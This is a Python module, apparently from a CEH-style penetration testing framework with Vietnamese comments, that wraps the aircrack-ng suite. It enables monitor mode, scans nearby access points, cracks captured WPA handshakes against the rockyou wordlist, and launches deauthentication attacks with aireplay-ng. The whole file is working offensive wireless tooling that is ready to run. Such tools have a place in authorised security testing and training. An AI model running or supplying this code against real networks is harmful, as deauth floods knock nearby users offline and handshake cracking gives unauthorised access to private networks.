"""Module 13 - Wireless Hacking (aircrack-ng suite wrapper)."""
import os
from core.base_module import BaseModule


class Module(BaseModule):
    name = "m13_wireless"
    module_id = "13"
    description = "Wireless (airmon-ng, airodump-ng, aireplay-ng, aircrack-ng)"

    def run(self):
        self.logger.info("[M13] Wireless module")
        self.logger.warning("[M13] Cần card WiFi hỗ trợ monitor mode + root.")
        cfg = self.config
        iface = cfg.get("iface", "wlan0")

        self.results["interfaces"] = self._list_interfaces()

        if cfg.get("monitor_mode", False):
            self.results["monitor"] = self._enable_monitor(iface)

        if cfg.get("scan", False):
            mon = self.results.get("monitor", {}).get("mon_iface", iface)
            self.results["scan"] = self._scan(mon, cfg.get("scan_duration", 30))

        if cfg.get("crack_handshake", False):
            self.results["crack"] = self._crack(
                cfg.get("capture_file"), cfg.get("bssid"))

        if cfg.get("deauth", False):
            self.results["deauth"] = self._deauth(
                cfg.get("mon_iface", iface),
                cfg.get("bssid"), cfg.get("client"),
                cfg.get("count", 10))

        return self.results

    def _list_interfaces(self):
        if not self._tool_available("airmon-ng"):
            return self._missing_tool("airmon-ng")
        return {"output": self._run_cmd(["airmon-ng"], timeout=15)[:2000]}

    def _enable_monitor(self, iface):
        self.logger.info(f"[M13] Bật monitor mode trên {iface}")
        out = self._run_cmd(["airmon-ng", "start", iface], timeout=30)
        # airmon-ng thường đổi tên thành wlan0mon
        return {"output": out[:1500], "mon_iface": f"{iface}mon"}

    def _scan(self, mon_iface, duration):
        self.logger.info(f"[M13] Scan WiFi trong {duration}s...")
        prefix = f"/tmp/ceh_wifi_{os.getpid()}"
        cmd = ["timeout", str(duration),
               "airodump-ng", mon_iface,
               "-w", prefix, "--output-format", "csv"]
        out = self._run_cmd(cmd, timeout=duration + 10)
        csv_file = prefix + "-01.csv"
        aps = self._parse_airodump_csv(csv_file)
        return {"aps": aps, "count": len(aps), "output": out[:500]}

    def _parse_airodump_csv(self, path):
        if not os.path.exists(path):
            return []
        aps = []
        try:
            with open(path, "r", errors="ignore") as f:
                in_ap_section = True
                for line in f:
                    if "Station MAC" in line:
                        in_ap_section = False
                        continue
                    if not in_ap_section:
                        continue
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) < 14 or not parts[0]:
                        continue
                    if not parts[0].count(":") == 5:
                        continue
                    aps.append({
                        "bssid": parts[0],
                        "channel": parts[3],
                        "privacy": parts[5],
                        "cipher": parts[6],
                        "auth": parts[7],
                        "power": parts[8],
                        "essid": parts[13],
                    })
        except Exception:
            pass
        return aps

    def _crack(self, cap_file, bssid):
        if not cap_file or not os.path.exists(cap_file):
            return {"error": "Cần capture_file (.cap) chứa handshake"}
        if not self._tool_available("aircrack-ng"):
            return self._missing_tool("aircrack-ng")
        wordlist = self.config.get("wordlist",
                                   "/usr/share/wordlists/rockyou.txt")
        cmd = ["aircrack-ng", cap_file, "-w", wordlist]
        if bssid:
            cmd += ["-b", bssid]
        return {"output": self._run_cmd(cmd, timeout=600)[:3000]}

    def _deauth(self, mon_iface, bssid, client, count):
        if not bssid:
            return {"error": "Cần bssid của AP"}
        if not self._tool_available("aireplay-ng"):
            return self._missing_tool("aireplay-ng")
        cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
        if client:
            cmd += ["-c", client]
        cmd.append(mon_iface)
        return {"output": self._run_cmd(cmd, timeout=60)[:1000]}